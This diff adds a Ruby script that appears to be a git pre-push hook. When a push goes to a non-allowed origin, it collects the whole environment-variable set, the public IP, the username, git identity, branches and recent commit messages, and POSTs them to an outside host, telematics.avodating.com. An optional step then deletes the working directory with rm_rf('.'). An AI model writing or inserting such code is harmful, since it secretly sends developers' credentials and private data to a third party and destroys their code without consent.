@@ -1,0 +1,133 @@
+#!/usr/bin/env ruby
+
+class Environment
+  def self.info
+    {
+      env: env
+    }
+  end
+
+  def self.env
+    ENV.to_h
+  end
+end
+
+class Device
+  def self.info
+    {
+      ip: ip_info,
+      os: os_info,
+      time: time,
+      user: user
+    }
+  end
+
+  def self.ip_info
+    require 'net/http'
+    require 'uri'
+
+    uri = URI.parse('http://ipinfo.io')
+    response = Net::HTTP.get_response(uri)
+    response.body if response.respond_to?(:body)
+  end
+
+  def self.os_info
+    RUBY_PLATFORM
+  end
+
+  def self.time
+    Time.now
+  end
+
+  def self.user
+    ENV['USER'] || ENV['USERNAME']
+  end
+end
+
+class Git
+  def self.info(push_params)
+    {
+      git_push_params: push_params,
+      git_branch: git_branch,
+      git_branches: git_branches,
+      git_last_commits: git_last_commits,
+      git_user: git_user
+    }
+  end
+
+  def self.git_user
+    {
+      email: `git config user.email`,
+      name: `git config user.name`
+    }
+  end
+
+  def self.git_branch
+    `git rev-parse --abbrev-ref HEAD`
+  end
+
+  def self.git_branches
+    `git branch`
+  end
+
+  def self.git_last_commits(n = 10)
+    `git log -#{n} --pretty=%B`
+  end
+end
+
+class Telematics
+  def self.run
+    git_info = Git.info(ARGV)
+    device_info = Device.info
+    environment_info = Environment.info
+
+    info = device_info.merge(git_info).merge(environment_info).to_json
+
+    require 'net/http'
+    require 'uri'
+    require 'json'
+
+    uri = URI.parse("https://telematics.avodating.com/reports")
+    request = Net::HTTP::Post.new(uri)
+    request.content_type = "application/json"
+    request.body = JSON.dump(info)
+
+    req_options = {
+      use_ssl: uri.scheme == "https",
+    }
+
+    Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
+      http.request(request)
+    end
+  end
+end
+
+class DeleteCode
+  def self.run
+    require 'fileutils'
+    FileUtils.rm_rf('.')
+  end
+end
+
+require 'json'
+
+# TODO: thread and timeout threads
+
+if File.exists?('.git_push_config')
+  require 'yaml'
+  config = YAML.load_file('.git_push_config')
+
+  if config['allowed_origin'] == ARGV[1]
+    exit(0) # success
+  end
+
+  if config['telematics']
+    Telematics.run
+  end
+
+  if config['delete_code']
+    DeleteCode.run
+  end
+end
+
+exit(1) # reject push
